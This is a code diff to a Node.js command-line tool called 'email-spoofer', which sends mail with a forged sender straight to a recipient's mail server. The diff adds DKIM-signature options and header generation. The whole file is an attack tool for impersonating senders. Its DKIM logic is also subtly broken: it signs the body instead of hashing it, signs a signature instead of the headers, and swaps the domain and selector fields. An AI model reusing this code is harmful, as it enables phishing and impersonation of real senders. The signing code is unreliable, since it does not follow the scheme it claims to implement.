@@ -1,23 +1,14 @@
 #! /usr/bin/env node
 import { OptionValues, program } from 'commander';
+import crypto from 'crypto';
 import dns, { MxRecord } from 'dns';
 import figlet from 'figlet';
+import fs from 'fs';
 import gradient from 'gradient-string';
 import nanospinner from 'nanospinner';
 import net from 'net';
 
 import { generateMessageID } from './message-id.js';
-
-const rainbow = {
-  red: '\x1b[31m',
-  green: '\x1b[32m',
-  yellow: '\x1b[33m',
-  blue: '\x1b[34m',
-  magenta: '\x1b[35m',
-  cyan: '\x1b[36m',
-  white: '\x1b[37m',
-  space: '     ',
-};
 
 program
   .name('email-spoofer')
@@ -37,6 +28,10 @@ program
   .option('--subject [string]', 'Subject of the email.');
 program
   .option('--body [string]', 'Body of the email.');
+program
+  .option('-d --dnsSelector [string]', 'DNS selector to use for DKIM public key.');
+program
+  .option('-k --dkimPrivateKey [file]', 'DKIM private key to use for signing the email.');
 
 program
   .option(`-s --smtp [string]`, `SMTP server to use. (Default: to email domain)`);
@@ -62,16 +57,16 @@ program.parse();
 let spinner = nanospinner.createSpinner(`Preparing attack...`);
 
 export const option: OptionValues = program.opts();
+
 if (option.help) {
   program.help();
 }
 
-console.log(gradient.rainbow(figlet.textSync('email-spoofer')));
-
-if (!(option.from && option.to)) {
-  console.log('Please provide a from and to email address.');
-  program.help();
+let privateKey: string;
+if (option.dkimPrivateKey) {
+  privateKey = fs.readFileSync(option.dkimPrivateKey as string, 'utf8');
 }
+console.log(gradient.rainbow(figlet.textSync('email-spoofer')));
 
 if (!option.smtp) {
   option.smtp = option.to.split('@')[1];
@@ -89,6 +84,17 @@ dns.resolveMx(option.smtp, (err, address: MxRecord[]) => {
     server, () => {
       console.log(`Connected to ${server} on port ${option.port}`);
     });
+  let b: string = '';
+  let bh: string = '';
+  if (option.dkimPrivateKey) {
+    const bhSigner = crypto.createSign('RSA-SHA256');
+    bhSigner.update(option.body || '');
+    bh = bhSigner.sign(privateKey, 'base64');
+
+    const bSigner = crypto.createSign('RSA-SHA256');
+    bSigner.update(bh || '');
+    b = bSigner.sign(privateKey, 'base64');
+  }
   const CRLF: string = '\r\n';
   const payload: string[] = [`HELO ${server}`];
   if (option.MF) {
@@ -121,6 +127,7 @@ From: ${option.from}`);
   }
   payload[payload.length - 1] += (`
 Message-ID: <${generateMessageID(option.from.split('@')[1])}>
+DKIM-Signature: v=1; a=rsa-sha256; d=${option.dnsSelector}; s=dkim; c=relaxed/relaxed; q=dns/txt; h=from:to:subject:date:message-id; bh=${bh}; b=${b};
 Subject: ${option.subject}
 
 ${option.body}
